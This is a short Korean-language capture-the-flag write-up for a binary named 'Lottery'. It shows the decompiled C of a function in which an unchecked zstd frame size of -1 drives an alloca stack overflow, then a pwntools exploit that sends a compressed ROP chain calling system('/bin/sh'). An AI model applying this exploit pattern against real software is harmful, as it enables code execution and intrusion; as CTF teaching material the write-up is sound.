# Lottery

# Usage

# Concept

- BOF, 공식문서 읽기 

# Writeup
바이너리는 매우 단순하게 구성되어있다. 유저가 보낸 압축파일의 압축비율이 50% 이하면 `system` 함수를 압축한 데이터를 커맨드로 해서 실행해준다. 
## 취약점
`ZSTD_getFrameContentSize` 에 대한 적절한 에러처리가 된것 처럼 보이지만 실제로는 그렇지 않다. 해당 함수는 압축데이터의 크기를 압축데이터에 포함시키지 않을 경우 -1을 반환하고 이는 추후 사용하는 `alloca` 로 인해서 스택오버플로우를 유발시킨다. 
```c
void *__fastcall sub_401366(__int64 a1, unsigned __int64 a2, _DWORD *a3)
{
  unsigned __int64 v4; // rax
  void *v5; // rsp
  _BYTE v6[8]; // [rsp+8h] [rbp-80h] BYREF
  _DWORD *v7; // [rsp+10h] [rbp-78h]
  unsigned __int64 v8; // [rsp+18h] [rbp-70h]
  __int64 v9; // [rsp+20h] [rbp-68h]
  void *dest; // [rsp+30h] [rbp-58h]
  size_t size; // [rsp+38h] [rbp-50h]
  void *src; // [rsp+40h] [rbp-48h]
  __int64 v13; // [rsp+48h] [rbp-40h]
  __int64 FrameContentSize; // [rsp+50h] [rbp-38h]

  v9 = a1;
  v8 = a2;
  v7 = a3;
  if ( a1 )
  {
    FrameContentSize = ZSTD_getFrameContentSize(v9, v8);
    if ( FrameContentSize == -2 || v8 > 0x100000 )
    {
      fwrite("please give valid compressed data\n", 1uLL, 0x22uLL, stderr);
      return 0LL;
    }
    else
    {
      v13 = FrameContentSize;
      v4 = 16 * ((8 * (FrameContentSize + 1) + 15) / 0x10uLL);
      while ( v6 != &v6[-(v4 & 0xFFFFFFFFFFFFF000LL)] )
        ;
      v5 = alloca(v4 & 0xFFF);
      if ( (v4 & 0xFFF) != 0 )
        *(_QWORD *)&v6[(v4 & 0xFFF) - 8] = *(_QWORD *)&v6[(v4 & 0xFFF) - 8];
      src = v6;
      size = ZSTD_decompress(v6, FrameContentSize, v9, v8);
      if ( (unsigned int)ZSTD_isError(size) )
      {
        fwrite("error while decompressing\n", 1uLL, 0x1AuLL, stderr);
        return 0LL;
      }
      else
      {
        dest = malloc(size);
        memcpy(dest, src, size);
        *v7 = size;
        return dest;
      }
    }
  }
  else
  {
    fwrite("null :(\n", 1uLL, 8uLL, stderr);
    return 0LL;
  }
}
```
익스플로잇 코드는 아래와 같다.
```py
import zstandard as zstd
from pwn import *

system = 0x401130
sh = 0x402017
pop_rdi_rbp = 0x401567

def compress(data):
    # very simple vuln 
    cctx = zstd.ZstdCompressor(level=3, write_content_size=False)    
    compressed = cctx.compress(data)
    return compressed

pl = p64(0x404000) * 16 + b'B' * 8 + p64(pop_rdi_rbp) + p64(sh) + p64(0) + p64(system)
data = compress(pl)
p = process('./chall')
pause()
p.send(data)
p.interactive()
```